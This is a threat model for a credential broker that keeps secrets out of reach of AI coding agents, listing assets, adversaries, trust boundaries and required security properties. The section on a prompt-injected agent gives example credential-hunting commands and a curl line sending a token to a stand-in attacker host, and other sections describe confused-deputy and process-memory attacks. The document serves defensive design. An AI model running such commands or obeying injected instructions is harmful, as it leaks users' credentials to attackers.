# Threat Model

## 1. Assets

### Highest sensitivity

- bearer tokens,
- passwords,
- private keys,
- OAuth refresh tokens,
- cloud long-lived access keys,
- vault master/decryption keys,
- session CA private keys used by transparent TLS mode.

### Security-sensitive metadata

- credential labels and account identities,
- policies,
- workspace mappings,
- audit trails,
- capability/session identifiers.

## 2. Adversaries

### A1 — Prompt-injected agent

The model follows malicious instructions from repository content, issue text, web pages or tool output and attempts to disclose credentials.

Examples:

```bash
env
set
cat ~/.config/*
cat /proc/self/environ
find ~ -type f | xargs grep -i token
curl https://evil.example/?x=$TOKEN
```

### A2 — Malicious repository script

A package hook, Makefile, Gradle/npm build, shell script, test or binary executed by the agent attempts credential discovery/exfiltration.

### A3 — Curious/hostile child process

A descendant tries `ptrace`, `/proc/<pid>/mem`, `process_vm_readv`, `pidfd_getfd`, core dumps or inherited file descriptors.

### A4 — Network exfiltration

A process does not need to read the secret if it can cause the broker to authenticate arbitrary outbound requests to an attacker-controlled destination.

This is why audience/destination/resource binding is mandatory.

### A5 — Confused-deputy attack

The agent tricks a generic broker into using a strong credential for a different host, redirect, resource or action than the user intended.

### A6 — UI/WebView compromise

XSS or compromised frontend dependency attempts privileged Tauri IPC or secret extraction.

### A7 — Local unprivileged process outside the agent session

Another same-user or different-user process attempts to connect to ASV IPC or reuse a capability/session handle.

### A8 — Stolen vault file

Attacker copies the encrypted database/snapshot from disk.

## 3. Trust boundaries

```text
UNTRUSTED
  Agent LLM
  agent process tree
  repository code/scripts
  third-party CLIs

SEMI-TRUSTED
  Tauri WebView
  shell shims
  MCP adapter
  session launcher

TRUSTED
  broker daemon
  policy engine
  connector code handling real credentials
  vault crypto

HIGH-PRIVILEGE BUT SECRET-FREE
  eBPF/cgroup enforcement daemon

EXTERNAL
  provider APIs / SSH / databases / MCP servers
```

The eBPF helper should not have access to decrypted secret material. The broker should not retain kernel-management privileges.

## 4. Explicitly excluded adversaries

Base product does not claim secrecy against:

- root with arbitrary code execution,
- compromised kernel/hypervisor,
- malicious firmware,
- cold-boot/physical memory laboratory attacks,
- hardware side-channel attacks,
- a provider itself returning the secret in a response.

TPM/non-exportable hardware keys can retain useful properties in some of those scenarios but do not make a bearer-token architecture immune to root.

## 5. Attack surface by channel

### Environment

Raw secrets MUST NOT be injected into the normal agent session environment.

Surrogate values may be injected. They must be session-bound and useless as remote credentials.

### argv

Raw secrets MUST NOT be accepted as ordinary CLI flags.

Credential creation through CLI uses no-echo TTY or a dedicated ingestion channel.

### Filesystem

Agent-readable files MUST NOT contain decrypted secrets.

Temporary credential files are prohibited in strong-secretless modes.

### Process memory

Secret-bearing broker memory is isolated by a distinct OS UID and strengthened with non-dumpable settings and protected memory where available.

### File descriptors

The broker must use `CLOEXEC` by default and avoid passing secret-bearing descriptors into untrusted children.

### Network

Credential use is audience-bound. Cross-origin redirects are rejected unless explicitly configured as an exact safe transition.

### Logs

Log schemas allow IDs and hashes, never auth headers or decrypted secret payloads.

## 6. Key security properties

### SP-01 Non-disclosure to agent

For `STRONG_SECRETLESS` integrations, the real secret never crosses into the agent process tree.

### SP-02 Non-transferable surrogate

Copying a placeholder/surrogate outside the authorized session does not grant access.

### SP-03 Destination binding

A GitHub credential configured for `api.github.com` cannot be injected into `evil.example` through arbitrary host headers, URL parsing tricks, DNS rebinding or redirects.

### SP-04 Policy-bound use

Even an authorized session cannot perform an operation outside the capability/policy grant.

### SP-05 Broker isolation

The agent cannot attach a debugger to, read `/proc/<broker>/mem`, duplicate broker FDs or trigger broker core dumps under normal unprivileged operation.

### SP-06 Revocation

Revoking a session or credential immediately prevents new brokered operations and tears down owned listeners/leases where practical.

### SP-07 Fail closed

Policy engine unavailable, connector validation failure, unknown destination or stale session results in denial.

## 7. Important limitation: capability abuse

Preventing secret disclosure does **not** make an over-broad capability safe.

If policy says:

```text
use GitHub credential for arbitrary HTTPS request to api.github.com
```

an injected agent may still delete resources or read sensitive data through that API.

Therefore ASV must evolve toward semantic operations/scopes where possible:

```text
repo.read
issue.create
release.create
```

instead of a single omnipotent `http.request`.
